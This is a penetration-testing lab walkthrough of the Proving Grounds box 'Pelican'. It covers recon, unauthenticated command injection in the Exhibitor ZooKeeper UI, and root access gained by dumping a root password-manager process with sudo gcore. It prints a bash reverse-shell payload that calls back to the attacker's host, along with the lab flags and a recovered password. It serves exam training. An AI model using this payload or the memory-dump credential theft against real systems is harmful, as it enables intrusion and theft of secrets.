---
aliases: ["Pelican", "pelican-pg"]
tags: [oscp, box, linux, medium]
---

# PG: Pelican, Full Walkthrough (Ping to Root)

## Tags
#PG #Pelican #Linux #WebApp #CommandInjection #ExhibitorUI #ZooKeeper #gcore #SudoPrivEsc #Medium

---

## Box Info

**Target:** `192.168.119.98` (swap for your instance IP) · **Difficulty:** Medium · **OS:** Linux (Debian 10) · **Platform:** Proving Grounds Practice

**The gist:** Debian box running Apache ZooKeeper with the Exhibitor web UI exposed on port 8080. Exhibitor's Config tab has a `java.env script` field that gets written into a shell script and executed when ZooKeeper starts — no authentication required. Injecting a bash reverse shell and committing the config gives a shell as `charles`. From there, `sudo -l` reveals that `/usr/bin/gcore` runs as root with no password. A `/usr/bin/password-store` process is running as root; dumping it with `sudo gcore` and running `strings` on the dump extracts the root password in plaintext straight from memory.

---

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -p- --min-rate 5000 -oA full_nmap $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 139/tcp | NetBIOS-SSN |
| 445/tcp | SMB |
| 631/tcp | IPP (CUPS) |
| 2181/tcp | ZooKeeper |
| 2222/tcp | SSH (alternate port) |
| 8080/tcp | HTTP — Jetty (Exhibitor) |
| 8081/tcp | HTTP — nginx |
| 46295/tcp | Java RMI |

![[pelican_nmap_allports.png]]

**Service scan on open ports:**
```bash
sudo nmap -p 22,139,445,631,2181,2222,8080,8081,46295 -sV -sC -oA service_nmap $BoxIP
```

Key findings:
- **Port 2181:** ZooKeeper 3.4.6-1569965 (built 02/20/2014 — very old)
- **Port 8080:** Jetty 1.0 — returns 404 on root
- **Port 8081:** nginx 1.14.2 — **immediately redirects to `http://$BoxIP:8080/exhibitor/v1/ui/index.html`** — this points directly at the target
- **Port 2222:** OpenSSH 7.9p1, same host keys as port 22 (duplicate, not useful)
- **Port 46295:** Java RMI — ZooKeeper management interface
- **Port 631:** CUPS 2.2.10 — returns Forbidden
- **SMB (445):** Samba 4.9.5-Debian, signing disabled, guest auth, WORKGROUP

The nginx redirect on 8081 is the key pivot — it tells us exactly what's running and where.

![[nmap-services.png]]

---

## 2. Foothold: Exhibitor UI Command Injection

**Browse to the Exhibitor UI:**
```
http://192.168.119.98:8080/exhibitor/v1/ui/index.html
```

The Exhibitor web frontend for Apache ZooKeeper loads with no authentication prompt.

![[http-exhibitor.png]]

Navigate to the **Config** tab. The page shows configuration fields for ZooKeeper. The **`java.env script`** field is the injection point — its content is written into a shell script and executed when ZooKeeper starts or its config is committed. There is no input sanitisation.

> [!warning] 💡 Hint
> **Watch out:** The command substitution runs when ZooKeeper evaluates the saved script, not when you type it into the browser. Commit the configuration to trigger it.

![[http-exhibiter-config-java.png|555]]![[shell-edit-commit.png|553]]
![[commit-confirm-change.png|554]]

**Start listener on Kali:**
```bash
nc -lnvp $Port
```

**Paste this into the `java.env script` field:**
```
$(/bin/bash -i >& /dev/tcp/$LocalIP/$Port 0>&1 &)
```

The `$()` causes the field content to execute as a command substitution when the script is evaluated. The `&` backgrounds it so ZooKeeper doesn't hang waiting for the shell to close.

**Click "Commit ZooKeeper Config".**

Shell received as `charles`:
```
uid=1000(charles) gid=1000(charles) groups=1000(charles)
```

![[nc-shell.png]]

**Upgrade the shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Stabilise (in Kali terminal):**
```bash
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter once — then inside the shell:
export TERM=xterm
```

---

## 3. User Flag

```bash
cat /home/charles/local.txt
```

![[flag.png]]

Flag: `e60096e0a88c99cb03173e34c24c29d8`

---

## 4. PrivEsc: sudo gcore → Memory Dump → Root Password

**Check sudo permissions:**
```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/gcore
```

`gcore` is a GNU debugger tool that generates a core dump of a live running process — all its memory, including anything stored in variables, buffers, or heap at the time of the dump. With sudo access, we can dump root-owned processes.

> 📸 `privesc-finding.png`

**Find a root process holding credentials:**
```bash
ps aux | grep root
```

Standout entry among the process list:
```
root   490   /usr/bin/password-store
```

> [!warning] 💡 Hint
> **Watch out:** `gcore` needs the live process ID, and that number can change after a restart. Run the process listing immediately before creating the dump.

A password manager process running as root. Its runtime memory will contain whatever passwords it has loaded — in plaintext, since the process has already decrypted them to use them.

**Dump the process memory:**
```bash
sudo gcore 490
```

Output:
```
Saved corefile core.490
```

The "No such file or directory" line about `nanosleep.c` is harmless — it just means debug symbols aren't installed. The dump was created successfully.

**Extract the password from the dump:**
```bash
strings core.490 | grep -A 1 "Password:"
```

```
001 Password: root:
ClogKingpinInning731
```

Root password in plaintext: `ClogKingpinInning731`

![[password-store.png]]
![[pass-root 1.png]]
**Escalate to root:**
```bash
su root
# Password: ClogKingpinInning731
```

```
uid=0(root) gid=0(root) groups=0(root)
```

![[su-root.png]]

---

## 5. Root Flag

```bash
cat /root/proof.txt
```

Flag: `621cff945f4af7c25ae63222ec6a6471`

![[root-flag-chain.png]]

---

## Summary

| Phase | Technique | Tool |
|-------|-----------|------|
| Recon | Full TCP + service scan | nmap |
| Foothold | Exhibitor java.env script command injection (unauthenticated) | Browser + nc |
| Shell | PTY upgrade + stty raw stabilisation | python3 + stty |
| PrivEsc | sudo gcore → root process memory dump → plaintext password | gcore + strings |
| Root | su with extracted password | su |

**Vulnerabilities:**
- Unauthenticated command injection in Exhibitor UI (`java.env script` field)
- Plaintext credential storage in memory (`/usr/bin/password-store` process)
- Over-privileged sudo rule (`gcore` NOPASSWD for all)

**Tools used:** nmap, nc, python3, gcore, strings

---

## Related Stage Notes
- [[Port Scan - Full]]
- [[Port Scan - Results Triage]]
- [[HTTP - Initial Recon]]
- [[Web App - Command Injection]]
- [[Shell - Upgrade]]
- [[PrivEsc Linux - Sudo]]

## Related Module Notes
- [[09. Common Web Application Attacks]] — command injection theory
- [[18. Linux Privilege Escalation]] — sudo privesc
- [[06. Information Gathering]] — recon methodology
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.

## Attack Chain

1. [[RUNBOOK V2/Linux - Service Scan]] located the web management service and its version.
2. [[RUNBOOK V2/Linux - Command Injection]] used the unauthenticated configuration field to receive a low-privilege shell.
3. [[RUNBOOK V2/Linux - Sudo Check]] showed that `gcore` could run as root without a password.
4. Memory inspection recovered the privileged credential, which gave access to the root proof file.

## Flags

- `user.txt`: `$UserFlag` (keep the value private)
- `root.txt`: `$RootFlag` (keep the value private)
- `proof.txt`: `$ProofFlag` (keep the value private)

## Lessons Learned

- Configuration fields that are written into startup scripts should be treated as possible command-injection points.
- A process-memory dump can expose secrets even when they are not stored in a readable file.
